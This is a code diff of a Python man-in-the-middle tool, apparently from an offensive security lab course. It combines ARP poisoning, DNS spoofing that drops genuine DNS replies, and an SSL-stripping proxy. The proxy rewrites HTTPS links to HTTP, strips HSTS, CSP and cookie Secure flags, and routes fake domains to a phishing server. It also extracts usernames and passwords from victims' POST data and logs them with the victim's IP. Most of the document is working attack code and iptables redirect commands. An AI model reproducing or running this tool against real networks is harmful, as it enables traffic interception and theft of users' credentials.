-        target_url = http_to_https_map.get(url, url)
-        if not target_url.startswith('https://'):
-            target_url = target_url.replace('http://', 'https://', 1)
-        
         try:
-            # Prepare request
-            headers = {}
-            for header, value in self.headers.items():
-                if header.lower() not in ['host', 'connection', 'proxy-connection']:
-                    headers[header] = value
-            
-            from urllib.parse import urlparse
-            parsed = urlparse(target_url)
-            headers['Host'] = parsed.netloc
-            
-            # Handle POST data
-            content_length = int(self.headers.get('Content-Length', 0))
             post_data = None
-            if method == 'POST' and content_length > 0:
-                post_data = self.rfile.read(content_length)
-                print(f"[SSL Strip] POST data intercepted ({content_length} bytes)")
             
-            # Make HTTPS request upstream
-            ssl_context = ssl.create_default_context()
-            ssl_context.check_hostname = False
-            ssl_context.verify_mode = ssl.CERT_NONE
+            # Read POST body if present
+            if method == 'POST':
+                content_length = int(self.headers.get('Content-Length', 0))
+                if content_length > 0:
+                    post_data = self.rfile.read(content_length)
+                    # Check for credentials in POST data
+                    self.log_credentials(post_data, self.headers.get('Host', 'unknown'))
             
-            req = urllib.request.Request(target_url, data=post_data, headers=headers)
+            # Extract host and path from request
+            host = self.headers.get('Host', '')
+            path = self.path
             
-            with urllib.request.urlopen(req, timeout=10, context=ssl_context) as response:
-                response_data = response.read()
-                response_headers = response.headers
-                status_code = response.getcode()
-                
-                # Check for redirects (HTTP→HTTPS bridge)
-                location = response_headers.get('Location', '')
-                if location and location.startswith('https://') and status_code in [301, 302, 303, 307, 308]:
-                    analyzer.log_https_upgrade(url, location, status_code)
-                
-                # Check for HSTS
-                if 'strict-transport-security' in response_headers:
-                    hsts_value = response_headers['strict-transport-security']
-                    analyzer.log_hsts(parsed.netloc, hsts_value)
-                
-                # Analyze cookies
-                set_cookies = response_headers.get_all('Set-Cookie')
-                if set_cookies:
-                    for cookie_str in set_cookies:
-                        cookie_name = cookie_str.split('=')[0]
-                        has_secure = 'Secure' in cookie_str or 'secure' in cookie_str
-                        has_httponly = 'HttpOnly' in cookie_str or 'httponly' in cookie_str
-                        analyzer.log_cookie(parsed.netloc, cookie_name, has_secure, has_httponly)
-                
-                # Strip HTTPS references from content
-                content_type = response_headers.get('Content-Type', '')
-                if 'text/html' in content_type:
-                    try:
-                        response_text = response_data.decode('utf-8', errors='ignore')
-                        
-                        # Find and strip HTTPS links
-                        https_urls = re.findall(r'https://[^\s<>"\']+', response_text)
-                        for https_url in https_urls:
-                            http_url = https_url.replace('https://', 'http://', 1)
-                            http_to_https_map[http_url] = https_url
-                            analyzer.log_link_strip(https_url)
-                        
-                        # Replace https:// with http://
-                        modified_text = re.sub(r'https://', 'http://', response_text, flags=re.IGNORECASE)
-                        response_data = modified_text.encode('utf-8')
-                        
-                        if https_urls:
-                            print(f"[SSL Strip] Stripped {len(https_urls)} HTTPS links")
-                    except Exception as e:
-                        print(f"[SSL Strip] Error during rewriting: {e}")
-                
-                # Send response to victim
-                self.send_response(200)
-                for header, value in response_headers.items():
-                    if header.lower() not in ['transfer-encoding', 'content-encoding', 
-                                             'strict-transport-security', 'connection']:
-                        self.send_header(header, value)
-                
-                self.send_header('Content-Length', len(response_data))
-                self.end_headers()
+            # Handle absolute URLs in path (proxy-style requests)
+            if path.startswith('http://') or path.startswith('https://'):
+                parsed = urllib.parse.urlparse(path)
+                host = parsed.netloc
+                path = parsed.path or '/'
+                if parsed.query:
+                    path += '?' + parsed.query
+            
+            # Validate host
+            if not host or '.' not in host or host in ['wpad', 'localhost']:
+                self.send_error(404, "Not Found")
+                return
+            
+            if not path.startswith('/'):
+                path = '/' + path
+            
+            original_url = f"http://{host}{path}"
+            analyzer.log_http_request(host, path, method)
+            print(f"[SSL Strip] {method} {original_url}")
+            
+            # Check if we've seen this URL redirect to HTTPS before
+            target_url = http_to_https_map.get(original_url, original_url)
+            
+            # Fetch content from real server
+            response_data, response_headers, status_code, final_url = self.fetch_url(
+                target_url, method, host, post_data
+            )
+            
+            if response_data is None:
+                self.send_error(502, "Failed to fetch")
+                return
+            
+            # Log if we detected HTTP->HTTPS upgrade (the "bridge")
+            if final_url and final_url.startswith('https://') and not target_url.startswith('https://'):
+                analyzer.log_https_upgrade(original_url, final_url, status_code)
+                http_to_https_map[original_url] = final_url
+            
+            # Analyze response headers for HSTS, cookies, etc.
+            self.analyze_response(host, response_headers)
+            
+            # Get content type to decide if we should strip HTTPS links
+            content_type = ''
+            for h, v in response_headers:
+                if h.lower() == 'content-type':
+                    content_type = v.lower()
+                    break
+            
+            # Strip HTTPS references from HTML, CSS, JavaScript
+            if any(ct in content_type for ct in ['text/html', 'text/css', 'javascript']):
+                response_data = self.strip_https_references(response_data, host)
+            
+            # Send response to victim
+            self.send_response(200)
+            
+            # Headers to skip (would break our attack or cause issues)
+            skip = {'transfer-encoding', 'content-encoding', 'content-length',
+                   'strict-transport-security', 'content-security-policy', 'connection'}
+            
+            for h, v in response_headers:
+                if h.lower() not in skip:
+                    # Strip Secure flag from cookies so they're sent over HTTP
+                    if h.lower() == 'set-cookie':
+                        v = self.strip_cookie_security(v)
+                    self.send_header(h, v)
+            
+            self.send_header('Content-Length', len(response_data))
+            self.end_headers()
+            
+            if method != 'HEAD':
                 self.wfile.write(response_data)
-        
+            
+            print(f"[SSL Strip] ✓ Sent {len(response_data)} bytes")
+            
         except Exception as e:
             print(f"[SSL Strip] Error: {e}")
-            self.send_error(502, f"Bad Gateway: {str(e)}")
+            try:
+                self.send_error(502, "Error")
+            except:
+                pass
+    
+    # Fetch URL from real server, following redirects
+    # Handles both HTTP and HTTPS, converts HTTPS responses to HTTP for victim
+    def fetch_url(self, url, method, original_host, post_data=None):
+        max_redirects = 10
+        current_url = url
+        final_url = url
+        
+        for _ in range(max_redirects):
+            parsed = urllib.parse.urlparse(current_url)
+            is_https = parsed.scheme == 'https'
+            hostname = parsed.netloc.split(':')[0]
+            port = parsed.port or (443 if is_https else 80)
+            path = parsed.path or '/'
+            if parsed.query:
+                path += '?' + parsed.query
+            
+            # Resolve real IP (bypasses our DNS spoof)
+            real_ip = resolve_real_ip(hostname)
+            if not real_ip:
+                # DNS resolution failed - probably a fake domain
+                # Forward to local phishing server instead
+                real_ip = CONFIG['ATTACKER_IP']
+                port = 80
+                print(f"[SSL Strip] -> Local phishing server {real_ip}:{port}")
+            
+            try:
+                # Create connection based on protocol
+                if is_https:
+                    # For HTTPS, disable certificate verification
+                    # (we're MITMing, server cert won't match)
+                    ctx = ssl.create_default_context()
+                    ctx.check_hostname = False
+                    ctx.verify_mode = ssl.CERT_NONE
+                    conn = DirectIPHTTPSConnection(real_ip, hostname, port, timeout=30, context=ctx)
+                else:
+                    conn = DirectIPHTTPConnection(real_ip, hostname, port, timeout=30)
+                
+                # Copy headers from original request (except problematic ones)
+                headers = {h: v for h, v in self.headers.items() 
+                          if h.lower() not in ['host', 'connection', 'accept-encoding']}
+                headers['Host'] = hostname
+                
+                # Make the request
+                conn.request(method, path, body=post_data if method == 'POST' else None, headers=headers)
+                response = conn.getresponse()
+                
+                # Handle redirects (301, 302, 303, 307, 308)
+                if response.status in [301, 302, 303, 307, 308]:
+                    location = response.getheader('Location', '')
+                    if location:
+                        # Handle relative redirects
+                        if location.startswith('/'):
+                            location = f"{parsed.scheme}://{hostname}{location}"
+                        elif not location.startswith('http'):
+                            location = urllib.parse.urljoin(current_url, location)
+                        
+                        print(f"[SSL Strip] Redirect -> {location}")
+                        
+                        # Track HTTP->HTTPS upgrade
+                        if location.startswith('https://') and current_url.startswith('http://'):
+                            final_url = location
+                        
+                        current_url = location
+                        
+                        # 301/302/303 redirects change POST to GET
+                        if response.status in [301, 302, 303]:
+                            method = 'GET'
+                            post_data = None
+                        
+                        conn.close()
+                        continue
+                
+                # Read response body and return
+                data = response.read()
+                conn.close()
+                return data, list(response.getheaders()), response.status, final_url
+                
+            except Exception as e:
+                print(f"[SSL Strip] Fetch error: {e}")
+                return None, [], 0, None
+        
+        return None, [], 0, None
+    
+    # Strip all HTTPS references from content, replacing with HTTP
+    # This prevents the browser from making direct HTTPS requests
+    def strip_https_references(self, data, host):
+        try:
+            text = data.decode('utf-8', errors='ignore')
+            
+            # Find all HTTPS URLs and cache them for future requests
+            for url in set(re.findall(r'https://[^\s<>"\'\\]+', text)):
+                url_clean = re.sub(r'[),;]+$', '', url)
+                http_to_https_map[url_clean.replace('https://', 'http://', 1)] = url_clean
+                analyzer.log_link_strip(url_clean)
+            
+            # Replace all https:// with http://
+            count = text.count('https://')
+            text = text.replace('https://', 'http://')
+            # Also handle JSON-escaped URLs
+            text = text.replace('https:\\/\\/', 'http:\\/\\/')
+            
+            if count > text.count('https://'):
+                print(f"[SSL Strip] Stripped {count - text.count('https://')} HTTPS refs")
+            
+            return text.encode('utf-8')
+        except:
+            return data
+    
+    # Remove Secure flag from cookies so they're sent over HTTP
+    def strip_cookie_security(self, value):
+        return re.sub(r';\s*[Ss]ecure\b', '', value)
+    
+    # Analyze response headers for security features
+    def analyze_response(self, host, headers):
+        for h, v in headers:
+            if h.lower() == 'strict-transport-security':
+                analyzer.log_hsts(host, v)
+            elif h.lower() == 'set-cookie':
+                name = v.split('=')[0].strip()
+                analyzer.log_cookie(host, name, 'secure' in v.lower(), 'httponly' in v.lower())
+    
+    # Check POST data for credentials (username, password, etc.)
+    def log_credentials(self, post_data, host):
+        try:
+            data_str = post_data.decode('utf-8', errors='ignore')
+            
+            # Patterns that indicate credential fields
+            patterns = ['password', 'passwd', 'pass', 'pwd', 'user', 'username', 'email', 'login']
+            found = [p for p in patterns if p in data_str.lower()]
+            
+            if found:
+                # Parse POST data to extract username and password
+                params = urllib.parse.parse_qs(data_str)
+                username = params.get('username', params.get('user', params.get('email', [''])))[0]
+                password = params.get('password', params.get('pass', params.get('pwd', [''])))[0]
+                
+                # Display captured credentials prominently
+                print(f"CREDENTIALS INTERCEPTED")
+                print(f"    Host: {host}")
+                print(f"    Username: {username}")
+                print(f"    Password: {password}")
+                print(f"    Time: {datetime.now().strftime('%H:%M:%S')}")
+                print(f"    Victim: {self.client_address[0]}")
+                
+                # Store for final report
+                captured_credentials.append({
+                    'timestamp': datetime.now().strftime('%H:%M:%S'),
+                    'host': host, 'username': username, 'password': password,
+                    'victim_ip': self.client_address[0]
+                })
+        except Exception as e:
+            print(f"[SSL Strip] Credential log error: {e}")
 
+# =============================================================================
+# SSL STRIPPING - Server Functions
+# =============================================================================
+# Start the SSL stripping proxy server
 def start_ssl_strip():
-    """Start the SSL stripping proxy with analysis."""
     global ssl_strip_server
-    
-    print(f"[SSL Strip] Starting SSL stripping proxy on port {SSL_STRIP_PORT}")
-    print(f"[SSL Strip] Mode: Analysis + Active Stripping")
-    print(f"[SSL Strip] Will track HTTP→HTTPS bridges, HSTS, and cookie security\n")
-    
+    print(f"[SSL Strip] Starting proxy on port {SSL_STRIP_PORT}")
     try:
-        ssl_strip_server = HTTPServer(('', SSL_STRIP_PORT), SSLStripHandler)
-        strip_thread = threading.Thread(target=ssl_strip_server.serve_forever)
-        strip_thread.daemon = True
-        strip_thread.start()
-        return strip_thread
+        # Allow port reuse to avoid "address already in use" errors
+        class ReusableTCPServer(HTTPServer):
+            allow_reuse_address = True
+        
+        # Create server listening on all interfaces
+        ssl_strip_server = ReusableTCPServer(('0.0.0.0', SSL_STRIP_PORT), SSLStripHandler)
+        
+        # Run in separate thread
+        thread = threading.Thread(target=ssl_strip_server.serve_forever)
+        thread.daemon = True
+        thread.start()
+        return thread
     except Exception as e:
-        print(f"[SSL Strip] Failed to start proxy: {e}")
+        print(f"[SSL Strip] Failed: {e}")
         return None
 
+# Set up iptables to redirect victim's HTTP traffic to our proxy
 def setup_ssl_strip_iptables():
-    """Configure iptables to redirect only HTTP traffic."""
-    redirect_cmd = (
-        f"sudo iptables -t nat -A PREROUTING -p tcp --dport 80 "
-        f"-s {CONFIG['VICTIM_IP']} -j REDIRECT --to-port {SSL_STRIP_PORT}"
-    )
-    print(f"[SSL Strip] Redirecting HTTP (port 80) to proxy")
-    os.system(redirect_cmd)
+    # Redirect victim's port traffic to our proxy on port 8080
+    cmd = f"sudo iptables -t nat -A PREROUTING -i {CONFIG['INTERFACE']} -p tcp -s {CONFIG['VICTIM_IP']} --dport 80 -j REDIRECT --to-port {SSL_STRIP_PORT}"
+    print(f"[SSL Strip] iptables redirect port 80 -> {SSL_STRIP_PORT}")
+    os.system(cmd)
 
+# Remove iptables rule
 def cleanup_ssl_strip_iptables():
-    """Remove SSL stripping iptables rules."""
-    remove_cmd = (
-        f"sudo iptables -t nat -D PREROUTING -p tcp --dport 80 "
-        f"-s {CONFIG['VICTIM_IP']} -j REDIRECT --to-port {SSL_STRIP_PORT}"
-    )
-    os.system(remove_cmd)
+    cmd = f"sudo iptables -t nat -D PREROUTING -i {CONFIG['INTERFACE']} -p tcp -s {CONFIG['VICTIM_IP']} --dport 80 -j REDIRECT --to-port {SSL_STRIP_PORT}"
+    os.system(cmd + " 2>/dev/null")
 
+# Stop the SSL stripping proxy and generate report
 def stop_ssl_strip():
-    """Stop the SSL stripping server and generate report."""
     global ssl_strip_server
-    
     if ssl_strip_server:
+        print("[SSL Strip] Shutting down...")
         ssl_strip_server.shutdown()
         ssl_strip_server = None
-    
-    # Generate comprehensive analysis report
     analyzer.generate_report()
 
-
-# MAIN EXECUTION AND CLEANUP 
-
+# =============================================================================
+# MAIN
+# =============================================================================
+# Main setup function - parses arguments and starts all attack components
 def setup_and_run():
-    global CONFIG, SPOOF_MAP, VICTIM_MAC, GATEWAY_IP, GATEWAY_MAC    
+    global CONFIG, SPOOF_MAP, VICTIM_MAC, GATEWAY_IP, GATEWAY_MAC
     
-    # Set up the argument parser
-    if_list = get_if_list()
-
-    parser = argparse.ArgumentParser(prog="Plug-and-play input")
-    parser.add_argument("--interface",
-                        choices=if_list,
-                        default=conf.iface,
-                        help="The network interface you want to use.")
-    parser.add_argument("--mode", 
-                        choices=["SILENT", "ALL_OUT"], 
-                        required=True,
-                        help="The attack mode. You can choose from silent or all-out.")
-    parser.add_argument("--target", 
-                        required=True,
-                        help="The IP address of your target.")
-
+    # Parse command line arguments
+    parser = argparse.ArgumentParser(prog="MITM Attack Tool")
+    parser.add_argument("--interface", type=str, required=True)
+    parser.add_argument("--mode", choices=["SILENT", "ALL_OUT"], required=True)
+    parser.add_argument("--target", required=True)
     args = parser.parse_args()
-
-    # Process --interface
-    CONFIG['INTERFACE'] = args.interface
-    CONFIG['ATTACKER_IP'] = get_if_addr(CONFIG['INTERFACE'])
-
-    # Process --mode
-    CONFIG['MODE'] = args.mode
-    if args.mode == "SILENT":
-        print("[SETUP] You have selected silent mode. What website do you want to spoof?")
-        website = input()
-        SPOOF_MAP[website] = CONFIG['ATTACKER_IP']
     
-    # Process --target
-    # Check what network the attacker is in
-    network = ipaddress.ip_network(f"{CONFIG['ATTACKER_IP']}/24", strict=False)
+    # Get attacker's IP address from interface
+    CONFIG['INTERFACE'] = args.interface
+    try:
+        CONFIG['ATTACKER_IP'] = get_if_addr(CONFIG['INTERFACE'])
+    except:
+        print(f"[!] Cannot get IP for {args.interface}")
+        sys.exit(1)
+    
+    # Set attack mode
+    CONFIG['MODE'] = args.mode
+    
+    # SILENT mode: ask for specific domain to spoof
+    if args.mode == "SILENT":
+        print("[SETUP] Enter website to spoof (e.g., 'example.com.'):")
+        website = input("[SETUP] Website: ").strip()
+        if not website.endswith('.'):
+            website += '.'
+        SPOOF_MAP[website] = CONFIG['ATTACKER_IP']
+        print(f"[SETUP] {website} -> {CONFIG['ATTACKER_IP']}")
+    
+    # Find gateway and validate target IP
     GATEWAY_IP = find_gateway()
-
-    # Check if the target IP is in the correct format, in the network, and is not the gateway
+    network = ipaddress.ip_network(f"{CONFIG['ATTACKER_IP']}/24", strict=False)
+    
     try:
         ip = ipaddress.ip_address(args.target)
-        if ip in network and ip != GATEWAY_IP:
-            CONFIG['VICTIM_IP'] = ip
+        if ip in network and str(ip) != GATEWAY_IP:
+            CONFIG['VICTIM_IP'] = str(ip)
         else:
-            print("[SETUP] The given IP address is not within this network or is the gateway IP. Exiting.")
+            print("[!] Invalid target")
             sys.exit(1)
-    except ValueError:
-        print("[SETUP] The given IP address is not of a valid format. Exiting.")
+    except:
+        print("[!] Invalid IP")
         sys.exit(1)
-
-    print(f"[SETUP] Starting MITM Attack [{CONFIG['MODE']} MODE] on Victim: {CONFIG['VICTIM_IP']}")
-
-    # Gather network details
+    
+    # Display attack configuration
+    print("\n" + "="*60)
+    print("    MITM Attack Tool - Offensive Cyber Security Lab")
+    print("="*60)
+    print(f"[*] Mode: {CONFIG['MODE']}")
+    print(f"[*] Attacker: {CONFIG['ATTACKER_IP']}")
+    print(f"[*] Victim: {CONFIG['VICTIM_IP']}")
+    print(f"[*] Interface: {CONFIG['INTERFACE']}")
+    
+    # Discover MAC addresses via ARP
     GATEWAY_MAC = find_mac(GATEWAY_IP)
     VICTIM_MAC = find_mac(CONFIG["VICTIM_IP"])
-
-    if not all([GATEWAY_MAC, VICTIM_MAC]):
-        print("[!] ERROR: Could not find MAC addresses for victim or gateway. Exiting.")
+    
+    if not GATEWAY_MAC or not VICTIM_MAC:
+        print("[!] Cannot find MAC addresses")
         sys.exit(1)
-
-    print(f"[ARP Poison] The gateway of this network is at IP address {GATEWAY_IP} and MAC address {GATEWAY_MAC}.")
-    print(f"[ARP Poison] The victim at IP address {CONFIG['VICTIM_IP']} is at MAC address {VICTIM_MAC}.")
-
-    # Enable IP Forwarding (Critical for MiTM)
-    # The attacker machine needs to forward the packets between gateway and victim.
+    
+    print(f"[*] Gateway: {GATEWAY_IP} ({GATEWAY_MAC})")
+    print(f"[*] Victim: {CONFIG['VICTIM_IP']} ({VICTIM_MAC})")
+    
+    # Enable IP forwarding so packets flow through us
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-    print("[*] IP Forwarding enabled.")
-
-    # Install the DNS Response Dropping Rule
-    manage_iptables('A') # Add the DROP rule
-    print("[DNS Spoof] DNS response dropping rule installed to win the race.")
-
-    # Start ARP Poisoning thread
-    arp_thread = threading.Thread(target=arp_poison_loop, 
-        args=(CONFIG["VICTIM_IP"], GATEWAY_IP, VICTIM_MAC, GATEWAY_MAC))
+    print("[*] IP Forwarding enabled")
+    
+    # Add iptables rule to drop legitimate DNS responses
+    manage_iptables('A')
+    
+    # Start ARP poisoning thread
+    arp_thread = threading.Thread(target=arp_poison_loop, args=(CONFIG["VICTIM_IP"], GATEWAY_IP, VICTIM_MAC, GATEWAY_MAC))
     arp_thread.daemon = True
     arp_thread.start()
-    print("[ARP Poison] ARP Poisoning started. MiTM position established.")
+    print("[ARP] Poisoning started")
     
-    # Start DNS Spoofing thread
+    # Start DNS spoofing thread
     dns_thread = start_dns_spoofing()
-    dns_thread.daemon = True
     dns_thread.start()
+    print("[DNS] Spoofing started")
     
-    # Start SSL Stripping
+    # Start SSL stripping proxy
     setup_ssl_strip_iptables()
     ssl_thread = start_ssl_strip()
-    print("[SSL Strip] SSL stripping attack activated.")
-
+    print("[SSL] Stripping proxy started")
+    
+    print("\n" + "="*60)
+    print("    Attack running. Ctrl+C to stop.")
+    print("="*60)
+    print(f"   Victim visits: http://{CONFIG['ATTACKER_IP']}/")
+    print("="*60 + "\n")
+    
     return arp_thread, dns_thread, ssl_thread
 
+# Cleanup function - restore network state and stop all components
 def cleanup():
-    """Handles graceful shutdown and resource cleanup."""
-
     global STOP_ATTACK
-    
-    # Check if cleanup was already initiated
     if STOP_ATTACK:
         return
-
-    print("\n[!] CTRL+C detected. Shutting down...")
     
-    STOP_ATTACK = True # Set the flag to stop the threads
-
-    # Wait briefly for sniffing thread to catch the signal and stop
-    time.sleep(1)
+    print("\n[!] Shutting down...")
+    STOP_ATTACK = True
+    time.sleep(2)  # Give threads time to stop
     
-    # Stop SSL stripping
+    # Stop SSL stripping and show report
     stop_ssl_strip()
     cleanup_ssl_strip_iptables()
     
-    # Restore ARP tables
-    if GATEWAY_IP and VICTIM_MAC:
+    # Restore ARP tables to original state
+    if GATEWAY_IP and VICTIM_MAC and GATEWAY_MAC:
         restore_arp(CONFIG["VICTIM_IP"], GATEWAY_IP, VICTIM_MAC, GATEWAY_MAC)
     
-    # REMOVE the DNS Response Dropping Rule
-    manage_iptables('D') # Delete the DROP rule
-    print("[DNS Spoof] DNS response dropping rule removed.")
+    # Remove DNS dropping rule
+    manage_iptables('D')
     
-    # Disable IP Forwarding
+    # Disable IP forwarding
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-    print("[*] IP Forwarding disabled.")
+    print("[*] Cleanup complete")
+    os._exit(0)
 
-    print("[*] Cleanup complete. Terminating.")
-
-# sudo python3 mitm_spoofer.py
+# =============================================================================
+# ENTRY POINT
+# =============================================================================
 if __name__ == "__main__":
-
-    # Hook the signal handler to the cleanup function, when Ctrl+C is pressed
-    signal.signal(signal.SIGINT, lambda s, f: cleanup())
-
-    arp_thread = None
-    dns_thread = None
-    ssl_thread = None
+    # Must run as root for raw sockets and iptables
+    if os.geteuid() != 0:
+        print("[!] Run as root: sudo python3 mitm_spoofer.py ...")
+        sys.exit(1)
+    
+    # Set up signal handlers for clean shutdown
+    signal.signal(signal.SIGINT, lambda s, f: cleanup())   # Ctrl+C
+    signal.signal(signal.SIGTERM, lambda s, f: cleanup())  # kill command
     
     try:
-        # Start the attack sequence
-        arp_thread, dns_thread, ssl_thread = setup_and_run()
-        
-        # Keep the main thread alive until user interruption
-        # When cleanup sets STOP_ATTACK, this loop will break
+        setup_and_run()
+        # Keep main thread alive
         while not STOP_ATTACK:
             time.sleep(1)
     except KeyboardInterrupt:
-        # This catches residual interrupts, but the signal handler should already have initiated cleanup.
-        pass
-    except SystemExit:
-        # This catches the clean exit from the signal handler.
-        pass
+        cleanup()
     except Exception as e:
-        print(f"\n[!!!] An unexpected error occurred: {e}")
-    finally:
-        # The finally block is the ultimate place to ensure cleanup happens
-        if not STOP_ATTACK: # Only clean up if the signal handler didn't already
-             cleanup()
+        print(f"[!] Error: {e}")
+        traceback.print_exc()
+        cleanup()
